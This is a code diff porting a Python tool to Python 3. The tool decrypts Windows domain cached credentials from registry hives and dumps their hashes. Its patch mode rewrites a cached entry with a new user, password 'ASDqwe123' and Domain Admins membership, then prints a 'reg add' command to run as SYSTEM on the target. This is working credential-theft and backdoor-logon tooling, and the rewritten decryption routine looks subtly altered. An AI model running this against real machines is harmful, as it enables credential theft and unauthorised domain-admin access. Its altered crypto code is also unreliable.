@@ -13,6 +13,7 @@ import hmac
 from passlib.hash import msdcc2
 import ntpath
 from datetime import datetime
+import codecs
 
 def take(s, sz, skip=-1):
     v = s[:sz]
@@ -20,64 +21,57 @@ def take(s, sz, skip=-1):
     return s[skip:], v
 
 def pad(data):
-    if (data & 0x3) > 0:
-        return data + (data & 0x3)
-    else:
-        return data
+    return data + (4 - (data % 4)) if (data % 4) > 0 else data
 
-# implementation of kull_m_crypto_aesCTSEncrypt from mimikatz
 def decrypt(cipher, key, iv):
     szData = len(cipher)
     aes = AES.new(key, AES.MODE_CBC, iv)
 
-    nbBlock = (szData + 15) >> 4
-    lastLen = (szData & 0xf) if (szData & 0xf) else 16
+    nbBlock = (szData + 15) // 16
+    lastLen = szData % 16 if (szData % 16) else 16
 
-    # 不解密 cipher 的最后两组
     plaintext = aes.decrypt(cipher[:16 * (nbBlock - 2)])
 
-    # buffer 包含最后没解密的两组
-    buffer = cipher[16 * (nbBlock -2):]
+    buffer = cipher[16 * (nbBlock - 2):]
     padding_count = 32 - len(buffer)
 
-    # 将 buffer padding 至 32 位
-    buffer += padding_count * '\x00'
+    buffer += b'\x00' * padding_count
     buffer = list(buffer)
 
-    aes_noiv = AES.new(key, AES.MODE_CBC, IV='\x00'*16)
+    aes_noiv = AES.new(key, AES.MODE_CBC, IV=b'\x00'*16)
 
-    # 解密 buffer 第 1 组
-    tmp = aes_noiv.decrypt(''.join(buffer[:16]))
+    tmp = aes_noiv.decrypt(bytes(buffer[:16]))
 
+    # Update the buffer with XOR results
     for i in range(16):
-        buffer[i] = chr(ord(tmp[i]) ^ ord(buffer[i+16]))
+        buffer[i] = (tmp[i] ^ buffer[i + 16]) & 0xFF  # Ensure result is within byte range
 
-    #buffer[lastLen + 16: lastLen + 16 + 16 - lastLen] = buffer[lastLen: lastLen + 16 - lastLen]
-    buffer[lastLen + 16: 32] = buffer[lastLen: 16]
+    # Convert buffer back to bytes after modifications
+    buffer = bytes(buffer[i] for i in range(32))
 
-    a = ''.join(buffer[16:])
-    plaintext += aes.decrypt(a)
-    plaintext += ''.join(buffer[:lastLen])
+    # Decrypt and concatenate remaining parts correctly
+    if len(buffer) > 16:
+        plaintext += aes.decrypt(buffer[:16])
+    if lastLen > 0:
+        plaintext += buffer[16:16 + lastLen]
 
     return plaintext
-        # &buffer[7 + 16], &buffer[7], 16 - 7
 
-# implementation of kull_m_crypto_aesCTSEncrypt from mimikatz
+
+
 def encrypt(plaintext, key, iv):
     szData = len(plaintext)
-    nbBlock = (szData + 15) >> 4
-    lastLen = (szData & 0xf) if (szData & 0xf) else 16
+    nbBlock = (szData + 15) // 16
+    lastLen = szData % 16 if (szData % 16) else 16
 
     aes = AES.new(key, AES.MODE_CBC, iv)
 
-    # 不加密最后两组
     cipher = aes.encrypt(plaintext[:16 * (nbBlock - 2)])
 
     buffer = plaintext[16 * (nbBlock -2):]
     padding_count = 32 - len(buffer)
 
-    # 将 buffer padding 至 32 位
-    buffer += padding_count * '\x00'
+    buffer += b'\x00' * padding_count
     buffer = aes.encrypt(buffer)
 
     cipher += buffer[16:32]
@@ -85,13 +79,11 @@ def encrypt(plaintext, key, iv):
 
     return cipher
 
-
-
 def filetime_to_dt(ft):
     EPOCH_AS_FILETIME = 116444736000000000  # January 1, 1970 as MS file time
     HUNDREDS_OF_NANOSECONDS = 10000000
 
-    return datetime.utcfromtimestamp((ft - EPOCH_AS_FILETIME) / HUNDREDS_OF_NANOSECONDS)
+    return datetime.utcfromtimestamp((ft - EPOCH_AS_FILETIME) // HUNDREDS_OF_NANOSECONDS)
 
 class Group(object):
     def __init__(self, relative_id, attributes):
@@ -108,17 +100,12 @@ class Group(object):
             519: '519<Enterprise Admins>'
         }.get(self.relative_id, str(self.relative_id))
 
-
 class EncData(object):
-
     def __init__(self, nl, nklm, valuename):
         self.valuename = valuename
         self._nl = nl
         self._nklm = nklm
-
-        #self._data = data = CryptoCommon().decryptAES(nklm[16:32], nl['EncryptedData'], nl['IV'])
         self._data = data = decrypt(nl['EncryptedData'], nklm[16:32], nl['IV'])
-
         data, self.mshashdata = take(data, 16)
         data, self.unkhash = take(data, 16)
         data, self.unk0 = take(data, 4)
@@ -134,21 +121,27 @@ class EncData(object):
 
         data, self.username = take(data, nl['UserLength'], pad(nl['UserLength']))
         self.username = self.username.decode('utf-16le')
+        print(self.username)
 
         data, self.domain = take(data, nl['DomainNameLength'], pad(nl['DomainNameLength']))
         self.domain = self.domain.decode('utf-16le')
+        print(self.domain)
 
         data, self.dns_domainname = take(data, nl['DnsDomainNameLength'], pad(nl['DnsDomainNameLength']))
         self.dns_domainname = self.dns_domainname.decode('utf-16le')
+        print(self.dns_domainname)
 
         data, self.upn = take(data, nl['UPN'], pad(nl['UPN']))
         self.upn = self.upn.decode('utf-16le')
+        print(self.upn)
 
         data, self.effective_name = take(data, nl['EffectiveNameLength'], pad(nl['EffectiveNameLength']))
         self.effective_name = self.effective_name.decode('utf-16le')
+        print(self.effective_name)
 
         data, self.fullname = take(data, nl['FullNameLength'], pad(nl['FullNameLength']))
         self.fullname = self.fullname.decode('utf-16le')
+        print(self.fullname)
 
         data, self.logonscript_name = take(data, nl['LogonScriptName'], pad(nl['LogonScriptName']))
         self.logonscript_name = self.logonscript_name.decode('utf-16le')
@@ -168,70 +161,60 @@ class EncData(object):
             rid = unpack('<I', rid)[0]
             data, attributes = take(data, 4, pad(4))
             attributes = unpack('<I', attributes)[0]
-
-            # print  rid, attributes
             self.groups += [Group(rid, attributes)]
-
 
         data, self.logon_domainname = take(data, nl['logonDomainNameLength'], pad(nl['logonDomainNameLength']))
         self.logon_domainname = self.logon_domainname.decode('utf-16le')
-
-
         self.unk_rest = data
-
 
     def is_domainadmin(self):
         for group in self.groups:
             if group.relative_id == 512:
                 return True
-
+        return False
 
     def add_group(self, relative_id, attributes=7):
-        self.groups.append(Group(relative_id,attributes))
-
+        self.groups.append(Group(relative_id, attributes))
 
     def format(self):
         ss = u'''# reg query "HKEY_LOCAL_MACHINE\SECURITY\Cache" /v "{valuename}"
-# {lastwrite}
+        # {lastwrite}
         username: {username} <{UPN}>
         domain groups: {groups}
         mscache hash: {hash}
-        domain: {domain}, {dns domain name}
-        effective name: {effective name}
-        full name: {full name}
-        logon script: {logon script}
-        profile path: {profile path}
+        domain: {domain}, {dns_domain_name}
+        effective name: {effective_name}
+        full name: {full_name}
+        logon script: {logon_script}
+        profile path: {profile_path}
         home: {home}
-        home drive: {home drive}
+        home drive: {home_drive}
         checksum: {checksum}
         IV: {IV}
-        '''.format(**{
-            'valuename': self.valuename,
-            'username': self.username,
-            'lastwrite':filetime_to_dt(self._nl['LastWrite']),
-            'groups': ', '.join(map(str, self.groups)),
-            'hash': self.mshashdata.encode('hex'),
-            'domain': self.domain,
-            'dns domain name': self.dns_domainname,
-            'UPN': self.upn,
-            'effective name': self.effective_name,
-            'full name': self.fullname,
-            'logon script': self.logonscript_name,
-            'profile path': self.profilepath,
-            'home': self.home,
-            'home drive': self.home_drive,
-            'checksum': self._nl['CH'].encode('hex'),
-            'IV': self._nl['IV'].encode('hex')
-        })
+        '''.format(valuename=self.valuename,
+                   username=self.username,
+                   lastwrite=filetime_to_dt(self._nl['LastWrite']),
+                   groups=', '.join(map(str, self.groups)),
+                   hash=self.mshashdata.hex(),
+                   domain=self.domain,
+                   dns_domain_name=self.dns_domainname,
+                   UPN=self.upn,
+                   effective_name=self.effective_name,
+                   full_name=self.fullname,
+                   logon_script=self.logonscript_name,
+                   profile_path=self.profilepath,
+                   home=self.home,
+                   home_drive=self.home_drive,
+                   checksum=self._nl['CH'].hex(),
+                   IV=self._nl['IV'].hex())
         return ss
-
 
     def setpassword(self, password):
         hash = msdcc2.hash(password, self.username)
-        self.mshashdata = hash.decode('hex')
+        self.mshashdata = bytes.fromhex(hash)
 
     def encode(self):
-        d = ''
+        d = b''
 
         for v in [self.mshashdata, self.unkhash, self.unk0, self.szSC, self.unkLength,
                   self.unk2, self.unk3, self.unk4, self.unk5, self.unk6, self.unk7, self.unk8]:
@@ -265,81 +248,79 @@ class EncData(object):
         encoded = self.encode()
         self._nl['CH'] = self.sign(encoded)
         self._nl['EncryptedData'] = encrypt(encoded, self._nklm[16:32], self._nl['IV'])
-        return self._nl.getData()
+        return self._nl
 
     def sign(self, data):
         return hmac.new(self._nklm[16:32], data, hashlib.sha1).digest()[:16]
 
-    def pack(self):
-        pass
-
     def pack_pad(self, d, unicodestr=True):
-        d = d.encode('utf-16le') if unicodestr else d
+        if unicodestr:
+            d = d.encode('utf-16le')
         l = len(d)
-        d += '\x00' * (pad(len(d)) - len(d))
+        padded_len = pad(l)
+        d += b'\x00' * (padded_len - l)
         return d, l
 
-
-
 class Secrets(LSASecrets):
-
     def __init__(self, security_hive, bootkey):
-        LSASecrets.__init__(self, security_hive, bootkey)
+        super().__init__(security_hive, bootkey)
         self.credentials = []
 
     def prepare(self):
-        # Let's first see if there are cached entries
-
         if not self.credentials:
             values = self.enumValues('\\Cache')
             if values is None:
-                print 'no cached credentials'
+                print('no cached credentials')
                 return
 
             try:
-                # Remove unnecessary value
-                values.remove('NL$Control')
-            except:
+                values.remove(b'NL$Control')
+            except ValueError:
                 pass
 
             self._LSASecrets__getLSASecretKey()
             self._LSASecrets__getNLKMSecret()
 
             for value in values:
-                nl = NL_RECORD(self.getValue(ntpath.join('\\Cache', value))[1])
-                if nl['IV'] != '\x00' *16:
+                print('processing', value)
+                nl = NL_RECORD(self.getValue(ntpath.join('\\Cache', value.decode("UTF-8")))[1])
+                if nl['IV'] != b'\x00' * 16:
                     en = EncData(nl, self._LSASecrets__NKLMKey, value)
                     self.credentials.append(en)
 
     def dump(self):
         self.prepare()
-        print 'dumping domain cached credentials'
+        print('dumping domain cached credentials')
         for cre in self.credentials:
-            print cre.format()
+            print(cre.format())
 
     def patch(self, user):
         self.prepare()
 
         for cre in self.credentials:
             if cre.username == user:
-                cre.logon_domainname = 'FAKE'
-                cre.domain = 'FAKE'
-                cre.dns_domainname = 'FAKE.COM'
+                cre.logon_domainname = 'ISTS'
+                cre.domain = 'ISTS'
+                cre.dns_domainname = 'ISTS.LOCAL'
 
-                uname = 'fakeuser'
+                uname = 'blackteambot'
                 cre.username = uname
                 cre.upn = cre.username + '@' + cre.dns_domainname.lower() if cre.dns_domainname else cre.upn.split('@')[1]
                 cre.effective_name = uname
-                # cre._nl['UserId'] = 6666
+                #cre._nl['UserId'] = 6666
+                cre.fullname = uname
 
-                password = 'n1nty@360 A-TEAM'
+                password = b'ASDqwe123'
                 cre.setpassword(password)
-
+                #cre.groups = []
                 if not cre.is_domainadmin():
                     cre.add_group(relative_id=512)
+                hex = codecs.encode(cre.dump().getData(), 'hex')
 
+                print(type(hex))
+                print(dir(hex))
 
-                print '''execute as SYSTEM on target: 
+                print('''execute as SYSTEM on target: 
     reg add "HKEY_LOCAL_MACHINE\SECURITY\Cache" /v "{nl}" /t REG_BINARY /d {binary} /f
 
 user being patched:
@@ -350,16 +331,13 @@ logon information:
     username: {domain}\{username}
     password: {password}
     * you can logon with credential above when there is !!!no contact with DC!!!. When there is, you can't do that
-                '''.format(patched_user=user, domain=cre.domain, username=cre.username, password=password, nl=cre.valuename, binary=cre.dump().encode('hex'))
+                '''.format(patched_user=user, domain=cre.domain, username=cre.username, password=password, nl=cre.valuename.decode("UTF-8"), binary=hex.decode("UTF-8")))
 
                 break
-
         else:
-            print 'not able to patch, there is no cached credential for', user
-            print
-
+            print('not able to patch, there is no cached credential for', user)
+            print()
             self.dump()
-
 
 if __name__ == '__main__':
     from optparse import OptionParser
@@ -367,18 +345,16 @@ if __name__ == '__main__':
     A small tool by n1nty @ 360 A-TEAM to play around with windows domain cached credentials, mainly based on the work of mimikatz and impacket
     Works for post-Vista systems.
     
-    {script} --system <system file> --security <security file>
+    %prog --system <system file> --security <security file>
         dump domain cached credentials
         
-    {script} --system <system file> --security <security file> --patch <username>
+    %prog --system <system file> --security <security file> --patch <username>
         patch credentials for <username>
-    '''.format(script=__file__))
+    ''')
 
     parser.add_option('--system', dest='system', help='path to the system file')
     parser.add_option('--security', dest='security', help='path to the security file')
     parser.add_option('--patch', dest='patch', help='the user to patch')
-
-
 
     (options, args) = parser.parse_args()
 
@@ -391,14 +367,7 @@ if __name__ == '__main__':
 
     secrets = Secrets(options.security, bootKey)
 
-
     if options.patch:
         secrets.patch(options.patch)
     else:
         secrets.dump()
-        #
-        # lst1 = [secrets.credentials[0].unk_rest] * len(secrets.credentials)
-        # lst2 = [cre.unk_rest for cre in secrets.credentials]
-        #
-        # print lst1 == lst2
-
